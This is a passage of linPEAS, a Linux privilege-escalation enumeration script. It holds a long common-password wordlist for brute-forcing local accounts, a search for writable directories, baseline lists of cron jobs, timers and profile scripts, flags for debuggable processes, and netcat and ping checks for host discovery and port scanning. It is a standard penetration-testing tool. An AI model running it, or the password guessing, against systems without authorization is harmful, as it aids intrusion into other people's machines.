flash excalibur discovery dddddd danny collins casino broncos brendan brasil apple123 yvonne wonder window tomato sundance sasha reggie redwings poison mypassword monopoly mariah margarita lionking king football1 director darling bubba biscuit 44444444 wisdom vivian virgin sylvester street stones sprite spike single sherlock sandy rocker robin matt marianne linda lancelot jeanette hobbes fred ferret dodger cotton corona clayton celine cannabis bella andromeda 7654321 4444 werewolf starcraft sampson redrum pyramid prodigy paul michel martini marathon longhorn leopard judith joanne jesus1 inferno holly harold happy123 esther dudley dragon1 darwin clinton celeste catdog brucelee argentina alpine 147852369 wrangler william1 vikings trigger stranger silvia shotgun scarlett scarlet redhead raider qweasdzxc playstation mystery morrison honda february fantasia designer coyote cool bulldogs bernie baby asdfghj angel1 always adam 202020 wanker sullivan stealth skeeter saturday rodney prelude pingpong phillip peewee peanuts peace nugget newport myself mouse memphis lover lancer kristine james1 hobbit halloween fuckyou1 finger fearless dodgers delete cougar
charmed cassandra caitlin bismillah believe alice airforce 7777 viper tony theodore sylvia suzanne starfish sparkle server samsam qweqwe public pass1234 neptune marian krishna kkkkkk jungle cinnamon bitches 741852 trojan theresa sweetheart speaker salmon powers pizza overlord michaela meredith masters lindsey history farmer express escape cuddles carson candy buttercup brownie broken abc12345 aardvark Passw0rd 141414 124578 123789 12345678910 00000 universal trinidad tobias thursday surfing stuart stinky standard roller porter pearljam mobile mirage markus loulou jjjjjj herbert grace goldie frosty fighter fatima evelyn eagle desire crimson coconut cheryl beavis anonymous andres africa 134679 whiskey velvet stormy springer soldier ragnarok portland oranges nobody nathalie malibu looking lemonade lavender hitler hearts gotohell gladiator gggggg freckles fashion david1 crusader cosmos commando clover clarence center cadillac brooks bronco bonita babylon archer alexandre 123654789 verbatim umbrella thanks sunny stalker splinter sparrow selena russia roberts register qwert123 penguins panda ncc1701d miracle melvin lonely lexmark kitkat julie graham frances estrella downtown doodle deborah cooler colombia chemistry cactus bridge bollocks beetle anastasia 741852963 69696969 unique sweets station showtime sheena santos rock revolution reading qwerasdf password2 mongoose marlene maiden machine juliet illusion hayden fabian derrick crazy cooldude chipper bomber blonde bigred amazing aliens abracadabra 123qweasd wwwwww treasure timber smith shelly sesame pirates pinkfloyd passwords nature marlin marines linkinpark larissa laptop hotrod gambit elvis education dustin devils damian christy braves baller anarchy white valeria underground strong poopoo monalisa memory lizzie keeper justdoit house homer gerard ericsson emily divine colleen chelsea1 cccccc camera bonbon billie bigfoot badass asterix anna animals
andy achilles a1s2d3f4 violin veronika vegeta tyler test1234 teddybear tatiana sporting spartan shelley sharks respect raven pentium papillon nevermind marketing manson madness juliette jericho gabrielle fuckyou2 forgot firewall faith evolution eric eduardo dagger cristian cavalier canadian bruno blowjob blackie beagle admin123 010101 together spongebob snakes sherman reddog reality ramona puppies pedro pacific pa55w0rd omega noodle murray mollie mister halflife franco foster formula1 felix dragonball desiree default chris1 bunny bobcat asdf123 951753 5555 242424 thirteen tattoo stonecold stinger shiloh seattle santana roger roberta rastaman pickles orion mustang1 felicia dracula doggie cucumber cassidy britney brianna blaster belinda apple1 753951 teddy striker stevie soleil snake skateboard sheridan sexsex roxanne redman qqqqqqqq punisher panama paladin none lovelife lights jerry iverson inside hornet holden groovy gretchen grandma gangsta faster eddie chevelle chester1 carrot cannon button administrator a 1212 zxc123 wireless volleyball vietnam twinkle terror sandiego rose pokemon1 picture parrot movies moose mirror milton mayday maestro lollypop katana johanna hunting hudson grizzly gorgeous garbage fish ernest dolores conrad chickens charity casey blueberry blackman blackbird bill beckham battle atlantic wildfire weasel waterloo trance storm singapore shooter rocknroll richie poop pitbull mississippi kisses karen juliana james123 iguana homework highland fire elliot eldorado ducati discover computer1 buddy1 antonia alphabet 159951 123456789a 1123581321 0123456 zaq1xsw2 webmaster vagina unreal university tropical swimmer sugar southpark silence sammie ravens question presario poiuytrewq palmer notebook newman nebraska manutd lucas hermes gators dave dalton cheetah cedric camilla bullseye bridget bingo ashton 123asd yahoo volume valhalla tomorrow starlight scruffy roscoe richard1 positive
plymouth pepsi patrick1 paradox milano maxima loser lestat gizmo ghetto faithful emerson elliott dominique doberman dillon criminal crackers converse chrissy casanova blowme attitude"
PASSTRY="2000" #Default num of passwds to try (all by default)

SEDOVERFLOW=true
while $SEDOVERFLOW; do
  WF=`find /dev /srv /proc /home /media /sys /lost+found /run /etc /root /var /tmp /mnt /boot /opt -type d -maxdepth $MAXPATH_FIND_W -writable 2>/dev/null | sort`
  Wfolders=`echo $WF | tr ' ' '|' | sed 's/|/\\\|/g'`"\|[^\*]\ \*"
  printf "test\ntest\ntest\ntest"| sed "s,$Wfolders\|\./\|\.:\|:\.,${C}[1;31;103m&${C}[0m,g" >/dev/null 2>&1
  if [ $? -eq 0 ]; then
      SEDOVERFLOW=false
  else
      MAXPATH_FIND_W=$(($MAXPATH_FIND_W-1)) #If overflow of directories, check again with MAXPATH_FIND_W - 1
  fi
done

notExtensions="\.tif$\|\.tiff$\|\.gif$\|\.jpeg$\|\.jpg\|\.jif$\|\.jfif$\|\.jp2$\|\.jpx$\|\.j2k$\|\.j2c$\|\.fpx$\|\.pcd$\|\.png$\|\.pdf$\|\.flv$\|\.mp4$\|\.mp3$\|\.gifv$\|\.avi$\|\.mov$\|\.mpeg$\|\.wav$\|\.doc$\|\.docx$\|\.xls$\|\.xlsx$"

TIMEOUT=`which timeout 2>/dev/null`
GCC=`which gcc 2>/dev/null`

pathshG="/0trace.sh\|/alsa-info.sh\|amuFormat.sh\|/blueranger.sh\|/dnsmap-bulk.sh\|/gettext.sh\|/go-rhn.sh\|/gvmap.sh\|/lesspipe.sh\|/mksmbpasswd.sh\|/setuporamysql.sh\|/setup-nsssysinit.sh\|/testacg.sh\|/testlahf.sh\|/url_handler.sh"

notBackup="/tdbbackup$\|/db_hotbackup$"

cronjobsG=".placeholder\|0anacron\|0hourly\|anacron\|apache2\|apport\|aptitude\|apt-compat\|bsdmainutils\|certwatch\|cracklib-runtime\|debtags\|dpkg\|e2scrub_all\|fake-hwclock\|fstrim\|john\|logrotate\|man-db.cron\|man-db\|mdadm\|mlocate\|ntp\|passwd\|php\|popularity-contest\|raid-check\|rwhod\|samba\|sysstat\|ubuntu-advantage-tools\|update-notifier-common\|upstart"
cronjobsB="centreon"

processesVB="jdwp\|tmux \|screen \|--inspect\|--remote-debugging-port"
processesB="knockd"

mail_apps="Postfix\|Dovecot\|Exim\|SquirrelMail\|Cyrus\|Sendmail\|Courier"

profiledG="01-locale-fix.sh\|256term.csh\|256term.sh\|abrt-console-notification.sh\|appmenu-qt5.sh\|apps-bin-path.sh\|bash_completion.sh\|cedilla-portuguese.sh\|colorgrep.csh\|colorgrep.sh\|colorls.csh\|colorls.sh\|colorxzgrep.csh\|colorxzgrep.sh\|colorzgrep.csh\|colorzgrep.sh\|csh.local\|gawk.csh\|gawk.sh\|kali.sh\|lang.csh\|lang.sh\|less.csh\|less.sh\|sh.local\|vim.csh\|vim.sh\|vte-2.91.sh\|which2.csh\|which2.sh\|Z97-byobu.sh\|Z99-cloudinit-warnings.sh\|Z99-cloud-locale-test.sh"

knw_emails="aeb@debian.org\|ah-util-linux@debian.org\|anibal@debian.org\|berni@debian.org\|daniel@lists.debian-maintainers.org\|debian@jff.email\|debian-boot@lists.debian.org\|debian-bsd@lists.debian.org\|debian-glibc@lists.debian.org\|debian-kernel@lists.debian.org\|debian-med-packaging@lists.alioth.debian.org\|devel@kali.org\|dm-devel@redhat.com\|djpig@debian.org\|ender@debian.org\|ftpmaster@ubuntu.com\|gcs@debian.org\|guillem@debian.org\|guus@debian.org\|isc-dhcp@packages.debian.org\|kernel-team@lists.ubuntu.com\|kilobyte@angband.pl\|lamont@debian.org\|linux-xfs@vger.kernel.org\|mattia@debian.org\|maxk@qualcomm.com\|mmind@debian.org\|mockbuild@kbuilder.bsys.centos.org\|open-iscsi@packages.debian.org\|open-isns@packages.debian.org\|packages@qa.debian.org\|packages@release.debian.org\|parted-maintainers@alioth-lists.debian.net\|parted-maintainers@lists.alioth.debian.org\|petere@debian.org\|pkg-gnupg-maint@lists.alioth.debian.org\|pkg-gnutls-maint@lists.alioth.debian.org\|pkg-grub-devel@lists.alioth.debian.org\|pkg-iscsi-maintainers@lists.alioth.debian.org\|pkg-lvm-maintainers@lists.alioth.debian.org\|pkg-mdadm-devel@lists.alioth.debian.org\|pkg-openssl-devel@lists.alioth.debian.org\|pkg-wpa-devel@lists.alioth.debian.org\|racke@linuxia.de\|rogershimizu@gmail.com\|team+dns@tracker.debian.org\|team+lvm@tracker.debian.org\|thmarques@gmail.com\|tigran@aivazian.fsnet.co.uk\|tytso@mit.edu\|ubuntu-devel-discuss@lists.ubuntu.com\|ubuntu-installer@lists.ubuntu.com\|wpa@packages.debian.org\|xfs@oss.sgi.com\|xnox@debian.org"

timersG="apt-daily.timer\|apt-daily-upgrade.timer\|e2scrub_all.timer\|fstrim.timer\|logrotate.timer\|man-db.timer\|motd-news.timer\|phpsessionclean.timer\|snapd.refresh.timer\|snapd.snap-repair.timer\|systemd-tmpfiles-clean.timer\|systemd-readahead-done.timer\|ureadahead-stop.timer"

commonrootdirsG="^/$\|/bin$\|/boot$\|/.cache$\|/dev$\|/etc$\|/home$\|/lost+found$\|/lib$\|/lib64$\|/media$\|/mnt$\|/opt$\|/proc$\|/root$\|/run$\|/sbin$\|/snap$\|/srv$\|/sys$\|/tmp$\|/usr$\|/var$"

ldsoconfdG="/lib32\|/lib/x86_64-linux-gnu\|/usr/lib32\|/usr/lib/x86_64-linux-gnu/libfakeroot\|/usr/lib/x86_64-linux-gnu\|/usr/local/lib/x86_64-linux-gnu\|/usr/local/lib"

###########################################
#---------) Checks before start (---------#
###########################################
# --) Writable folder
# --) ps working good
# --) Network binaries

Wfolder=""
for f in $WF; do
  echo '' 2>/dev/null > $f/$filename
  if [ $? -eq 0 ]; then Wfolder="$f"; file="$f/$filename"; rm -f $f/$filename 2>/dev/null; break; fi;
done;

if [ `ps aux 2>/dev/null | wc -l 2>/dev/null` -lt 8 ]; then
  NOUSEPS="1"
fi

DISCOVER_BAN_BAD="No network discovery capabilities (fping or ping not found)"
FPING=$(which fping)
PING=$(which ping)
if [ "$FPING" ]; then
  DISCOVER_BAN_GOOD="$GREEN$FPING$B is available for network discovery$LG (linpeas can discover hosts, learn more with -h)"
else
  if [ "$PING" ]; then
    DISCOVER_BAN_GOOD="$GREEN$PING$B is available for network discovery$LG (linpeas can discover hosts, learn more with -h)"
  fi
fi

SCAN_BAN_BAD="No port scan capabilities (nc not found)"
FOUND_NC=$(which nc 2>/dev/null)
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(which netcat 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(which ncat 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(which nc.traditional 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(which nc.openbsd 2>/dev/null);
fi
if [ "$FOUND_NC" ]; then
  SCAN_BAN_GOOD="$GREEN$FOUND_NC$B is available for network discover & port scanning$LG (linpeas can discover hosts and scan ports, learn more with -h)"
fi


###########################################
#-----------) Main Functions (------------#
###########################################

echo_not_found (){
  printf $DG"$1 Not Found\n"$NC
}

echo_no (){
  printf $DG"No\n"$NC
}

print_ps (){
  (for f in `ls -d /proc/*/`; do 
    CMDLINE=`cat $f/cmdline 2>/dev/null | grep -v "seds,"`; #Delete my own sed processess
    if [ "$CMDLINE" ]; 
      then USER=ls -ld $f | awk '{print $3}'; PID=`echo $f | cut -d "/" -f3`; 
      printf "  %-13s  %-8s  %s\n" "$USER" "$PID" "$CMDLINE"; 
    fi; 
  done) 2>/dev/null | sort -r
}

print_banner(){
  if [ -f "/bin/bash" ]; then
  /bin/bash -c "printf '
                     \e[48;2;194;194;194m\e[38;2;26;43;21m▄\e[48;2;159;158;159m\e[38;2;58;91;50m▄\e[48;2;130;130;130m\e[38;2;68;119;56m▄\e[48;2;116;117;116m\e[38;2;86;143;70m▄\e[48;2;98;98;98m\e[38;2;100;153;87m▄\e[48;2;63;65;63m\e[38;2;102;164;86m▄\e[48;2;46;49;44m\e[38;2;98;168;79m▄\e[48;2;43;45;43m\e[38;2;91;155;75m▄\e[48;2;61;62;61m\e[38;2;78;137;63m▄\e[48;2;102;101;102m\e[38;2;64;112;52m▄\e[48;2;134;134;134m\e[38;2;38;67;32m▄\e[48;2;164;164;164m\e[38;2;20;35;16m▄\e[48;2;188;187;188m\e[38;2;10;20;8m▄\e[48;2;223;223;223m\e[38;2;15;21;13m▄\e[0m
             \e[48;2;230;230;230m\e[38;2;49;80;41m▄\e[48;2;132;132;133m\e[38;2;73;133;59m▄\e[48;2;20;21;20m\e[38;2;91;163;72m▄\e[48;2;14;27;12m\e[38;2;96;174;76m▄\e[48;2;51;92;41m\e[38;2;98;177;78m▄\e[48;2;86;155;68m\e[38;2;98;177;78m▄\e[48;2;96;173;77m\e[38;2;98;177;78m▄\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;178;78m\e[38;2;98;177;78m▄\e[48;2;97;175;76m\e[38;2;98;177;78m▄\e[48;2;93;168;74m\e[38;2;98;177;78m▄\e[48;2;99;163;83m\e[38;2;97;177;77m▄\e[48;2;99;151;86m\e[38;2;98;177;78m▄\e[48;2;35;57;29m\e[38;2;98;176;78m▄\e[48;2;19;21;19m\e[38;2;94;169;75m▄\e[48;2;118;118;118m\e[38;2;70;125;56m▄\e[48;2;234;234;234m\e[38;2;30;45;26m▄\e[0m
      \e[48;2;216;216;216m\e[38;2;42;65;36m▄\e[48;2;159;159;159m\e[38;2;62;106;52m▄\e[48;2;94;95;94m\e[38;2;86;152;70m▄\e[48;2;57;72;53m\e[38;2;96;174;77m▄\e[48;2;57;96;47m\e[38;2;98;177;78m▄\e[48;2;78;136;62m\e[38;2;98;177;78m▄\e[48;2;95;167;76m\e[38;2;98;177;78m▄\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;176;77m▄\e[48;2;98;177;78m\e[38;2;91;165;72m▄\e[48;2;98;177;78m\e[38;2;76;137;60m▄\e[48;2;98;177;78m\e[38;2;54;97;42m▄\e[48;2;99;179;79m\e[38;2;39;71;30m▄\e[48;2;100;181;79m\e[38;2;35;60;30m▄\e[48;2;101;181;81m\e[38;2;42;66;37m▄\e[48;2;100;177;80m\e[38;2;52;73;45m▄\e[48;2;95;175;76m\e[38;2;47;75;40m▄\e[48;2;94;178;73m\e[38;2;41;75;33m▄\e[48;2;98;179;78m\e[38;2;42;73;34m▄\e[48;2;99;180;79m\e[38;2;40;70;33m▄\e[48;2;99;179;78m\e[38;2;44;75;36m▄\e[48;2;97;177;77m\e[38;2;55;93;46m▄\e[48;2;97;176;77m\e[38;2;65;113;52m▄\e[48;2;98;177;78m\e[38;2;79;141;63m▄\e[48;2;98;177;78m\e[38;2;93;166;75m▄\e[48;2;98;177;78m\e[38;2;99;177;79m▄\e[48;2;98;177;78m\e[38;2;97;177;78m▄\e[48;2;98;177;78m\e[38;2;97;177;78m▄\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;94;170;75m\e[38;2;98;177;78m▄\e[48;2;71;128;56m\e[38;2;98;177;78m▄\e[48;2;34;56;28m\e[38;2;97;175;77m▄\e[48;2;64;66;64m\e[38;2;78;140;62m▄\e[48;2;161;161;161m\e[38;2;48;84;39m▄\e[0m
  \e[48;2;66;112;54m\e[38;2;98;177;78m▄\e[48;2;80;133;66m\e[38;2;98;177;78m▄\e[48;2;95;162;76m\e[38;2;98;177;78m▄\e[48;2;96;171;76m\e[38;2;98;177;78m▄\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;176;78m▄\e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;97;176;77m▄\e[48;2;98;177;78m\e[38;2;96;174;76m▄\e[48;2;98;177;78m\e[38;2;74;130;59m▄\e[48;2;98;176;78m\e[38;2;32;49;27m▄\e[48;2;95;166;76m\e[38;2;18;29;15m▄\e[48;2;73;126;59m\e[38;2;65;113;53m▄\e[48;2;40;62;34m\e[38;2;107;209;83m▄\e[48;2;23;43;19m\e[38;2;77;220;42m▄\e[48;2;32;72;22m\e[38;2;72;218;36m▄\e[48;2;55;155;30m\e[38;2;73;217;37m▄\e[48;2;71;203;38m\e[38;2;73;217;37m▄\e[48;2;79;212;46m\e[38;2;73;218;37m▄\e[48;2;81;216;48m\e[38;2;73;218;37m▄\e[48;2;82;220;48m\e[38;2;73;218;37m▄\e[48;2;79;221;44m\e[38;2;73;218;37m▄\e[48;2;76;219;40m\e[38;2;73;218;37m▄\e[48;2;76;218;40m\e[38;2;73;218;37m▄\e[48;2;75;213;41m\e[38;2;73;218;37m▄\e[48;2;79;203;48m\e[38;2;73;218;37m▄\e[48;2;76;175;52m\e[38;2;73;218;37m▄\e[48;2;52;127;33m\e[38;2;73;218;37m▄\e[48;2;29;75;18m\e[38;2;73;217;37m▄\e[48;2;19;45;12m\e[38;2;73;218;36m▄\e[48;2;45;74;38m\e[38;2;65;196;33m▄\e[48;2;76;127;62m\e[38;2;44;132;24m▄\e[48;2;90;158;72m\e[38;2;16;45;10m▄\e[48;2;97;175;77m\e[38;2;28;50;22m▄\e[48;2;98;177;78m\e[38;2;80;145;64m▄\e[48;2;98;177;78m\e[38;2;97;175;77m▄\e[48;2;98;177;78m\e[38;2;97;176;77m▄\e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;176;78m▄\e[48;2;98;177;78m\e[38;2;98;177;77m▄\e[48;2;97;173;78m\e[38;2;98;177;78m▄\e[48;2;69;114;56m\e[38;2;98;177;78m▄\e[48;2;30;38;28m\e[38;2;103;179;83m▄\e[48;2;91;91;91m\e[38;2;99;149;87m▄\e[48;2;188;188;188m\e[38;2;39;53;36m▄\e[0m
  \e[48;2;98;177;78m\e[38;2;98;177;77m▄\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;98;178;78m▄\e[48;2;98;177;78m\e[38;2;98;178;78m▄\e[48;2;98;177;78m\e[38;2;83;150;66m▄\e[48;2;98;177;78m\e[38;2;44;80;34m▄\e[48;2;99;179;78m\e[38;2;33;49;28m▄\e[48;2;87;159;69m\e[38;2;68;97;61m▄\e[48;2;46;84;37m\e[38;2;87;165;68m▄\e[48;2;25;37;21m\e[38;2;83;208;52m▄\e[48;2;59;131;42m\e[38;2;73;219;37m▄\e[48;2;74;199;43m\e[38;2;74;223;37m▄\e[48;2;72;213;38m\e[38;2;67;204;35m▄\e[48;2;73;218;37m\e[38;2;55;171;29m▄\e[48;2;72;218;36m\e[38;2;59;136;22m▄\e[48;2;72;218;36m\e[38;2;103;132;15m▄\e[48;2;73;219;37m\e[38;2;149;133;9m▄\e[48;2;72;220;37m\e[38;2;168;130;7m▄\e[48;2;73;220;37m\e[38;2;167;118;5m▄\e[48;2;72;218;37m\e[38;2;106;78;4m▄\e[48;2;69;210;36m\e[38;2;93;69;4m▄\e[48;2;66;199;34m\e[38;2;173;117;4m▄\e[48;2;63;192;32m\e[38;2;177;119;4m▄\e[48;2;62;186;32m\e[38;2;173;116;4m▄\e[48;2;61;186;31m\e[38;2;176;115;4m▄\e[48;2;63;191;32m\e[38;2;174;115;4m▄\e[48;2;67;202;34m\e[38;2;170;113;4m▄\e[48;2;70;213;36m\e[38;2;180;118;3m▄\e[48;2;72;219;37m\e[38;2;175;117;4m▄\e[48;2;73;220;37m\e[38;2;154;120;7m▄\e[48;2;73;220;37m\e[38;2;80;94;11m▄\e[48;2;73;219;37m\e[38;2;48;93;15m▄\e[48;2;73;218;37m\e[38;2;41;112;19m▄\e[48;2;72;215;36m\e[38;2;45;144;25m▄\e[48;2;64;192;32m\e[38;2;63;191;32m▄\e[48;2;32;99;16m\e[38;2;73;218;37m▄\e[48;2;21;41;16m\e[38;2;72;210;38m▄\e[48;2;38;66;30m\e[38;2;67;177;41m▄\e[48;2;79;141;63m\e[38;2;53;123;36m▄\e[48;2;98;178;78m\e[38;2;32;57;25m▄\e[48;2;98;179;77m\e[38;2;25;46;20m▄\e[48;2;97;177;77m\e[38;2;56;100;46m▄\e[48;2;98;177;78m\e[38;2;93;165;75m▄\e[48;2;97;176;77m\e[38;2;100;181;80m▄\e[48;2;98;177;77m\e[38;2;97;176;76m▄\e[48;2;97;176;78m\e[38;2;98;177;78m▄\e[48;2;99;174;79m\e[38;2;98;177;78m▄\e[0m
  \e[48;2;98;178;78m\e[38;2;46;76;38m▄\e[48;2;100;178;80m\e[38;2;50;69;45m▄\e[48;2;99;176;80m\e[38;2;35;46;33m▄\e[48;2;82;148;65m\e[38;2;7;9;6m▄\e[48;2;64;117;50m\e[38;2;35;54;30m▄\e[48;2;42;77;34m\e[38;2;52;107;39m▄\e[48;2;26;46;21m\e[38;2;80;194;52m▄\e[48;2;34;71;26m\e[38;2;73;216;38m▄\e[48;2;54;133;35m\e[38;2;67;192;32m▄\e[48;2;81;199;52m\e[38;2;81;158;23m▄\e[48;2;80;218;46m\e[38;2;100;110;11m▄\e[48;2;66;199;33m\e[38;2;152;98;2m▄\e[48;2;60;157;26m\e[38;2;220;129;1m▄\e[48;2;80;128;18m\e[38;2;251;145;0m▄\e[48;2;120;110;9m\e[38;2;255;147;0m▄\e[48;2;154;106;4m\e[38;2;255;147;0m▄\e[48;2;181;114;2m\e[38;2;255;147;0m▄\e[48;2;230;134;0m\e[38;2;255;147;0m▄\e[48;2;251;144;0m\e[38;2;255;147;0m▄\e[48;2;254;146;0m\e[38;2;255;147;0m▄\e[48;2;255;147;0m \e[48;2;163;94;0m\e[38;2;134;78;0m▄\e[48;2;2;1;0m\e[38;2;58;33;0m▄\e[48;2;13;7;0m\e[38;2;133;76;0m▄\e[48;2;64;38;0m\e[38;2;12;7;0m▄\e[48;2;250;144;0m\e[38;2;234;135;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;249;146;0m\e[38;2;255;147;0m▄\e[48;2;239;143;2m\e[38;2;255;147;0m▄\e[48;2;223;131;1m\e[38;2;255;147;0m▄\e[48;2;192;120;2m\e[38;2;255;147;0m▄\e[48;2;130;96;5m\e[38;2;255;147;0m▄\e[48;2;82;88;9m\e[38;2;255;148;0m▄\e[48;2;62;104;15m\e[38;2;247;147;1m▄\e[48;2;49;132;22m\e[38;2;212;134;3m▄\e[48;2;57;165;32m\e[38;2;144;95;3m▄\e[48;2;53;117;38m\e[38;2;74;61;8m▄\e[48;2;50;97;39m\e[38;2;47;60;21m▄\e[48;2;35;56;29m\e[38;2;47;81;33m▄\e[48;2;17;22;15m\e[38;2;20;34;19m▄\e[48;2;31;50;26m\e[38;2;48;73;42m▄\e[48;2;55;90;47m\e[38;2;37;56;33m▄\e[48;2;78;132;64m\e[38;2;21;31;18m▄\e[48;2;95;167;78m\e[38;2;18;26;16m▄\e[0m
  \e[48;2;48;74;43m\e[38;2;51;78;45m▄\e[48;2;48;74;43m\e[38;2;50;76;44m▄\e[48;2;46;71;42m\e[38;2;12;17;11m▄\e[48;2;32;54;28m\e[38;2;45;93;35m▄\e[48;2;58;112;46m\e[38;2;26;45;17m▄\e[48;2;55;130;37m\e[38;2;121;83;5m▄\e[48;2;57;133;27m\e[38;2;232;138;0m▄\e[48;2;101;96;8m\e[38;2;253;146;0m▄\e[48;2;200;118;1m\e[38;2;254;147;0m▄\e[48;2;248;144;0m\e[38;2;255;147;0m▄\e[48;2;254;147;0m\e[38;2;255;147;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;173;100;0m\e[38;2;210;122;0m▄\e[48;2;172;100;0m\e[38;2;76;44;0m▄\e[48;2;214;123;0m\e[38;2;153;88;0m▄\e[48;2;36;21;0m\e[38;2;162;94;0m▄\e[48;2;201;116;0m\e[38;2;20;12;0m▄\e[48;2;254;147;0m\e[38;2;238;137;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;254;147;0m\e[38;2;255;147;0m▄\e[48;2;241;143;1m\e[38;2;255;147;0m▄\e[48;2;213;125;0m\e[38;2;255;147;0m▄\e[48;2;117;73;3m\e[38;2;252;147;1m▄\e[48;2;25;36;21m\e[38;2;94;69;18m▄\e[48;2;50;77;44m\e[38;2;39;59;33m▄\e[48;2;51;78;45m \e[48;2;51;78;44m\e[38;2;51;78;45m▄\e[0m
  \e[48;2;51;78;45m\e[38;2;50;76;44m▄\e[48;2;40;58;34m\e[38;2;43;36;13m▄\e[48;2;38;37;6m\e[38;2;240;143;2m▄\e[48;2;149;95;6m\e[38;2;254;147;0m▄\e[48;2;226;134;1m\e[38;2;255;147;0m▄\e[48;2;253;146;0m\e[38;2;255;147;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;243;140;0m▄\e[48;2;116;67;0m\e[38;2;90;52;0m▄\e[48;2;237;137;0m\e[38;2;254;147;0m▄\e[48;2;248;143;0m\e[38;2;255;147;0m▄\e[48;2;250;144;0m\e[38;2;255;147;0m▄\e[48;2;45;25;0m\e[38;2;191;110;0m▄\e[48;2;64;36;0m\e[38;2;32;18;0m▄\e[48;2;245;141;0m\e[38;2;152;87;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;254;147;0m\e[38;2;255;147;0m▄\e[48;2;230;140;6m\e[38;2;254;147;0m▄\e[48;2;25;21;7m\e[38;2;143;86;2m▄\e[48;2;48;74;42m\e[38;2;39;60;34m▄\e[48;2;51;78;45m \e[0m
  \e[48;2;41;63;37m\e[38;2;40;47;23m▄\e[48;2;119;70;1m\e[38;2;230;135;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;180;104;0m\e[38;2;120;68;0m▄\e[48;2;135;78;0m\e[38;2;158;91;0m▄\e[48;2;255;147;0m\e[38;2;250;145;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;254;146;0m▄\e[48;2;252;145;0m\e[38;2;209;120;0m▄\e[48;2;54;31;0m\e[38;2;61;35;0m▄\e[48;2;94;54;0m\e[38;2;159;91;0m▄\e[48;2;254;146;0m\e[38;2;244;140;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;240;144;1m\e[38;2;255;147;0m▄\e[48;2;36;40;18m\e[38;2;70;49;6m▄\e[48;2;50;78;45m\e[38;2;45;69;40m▄\e[0m
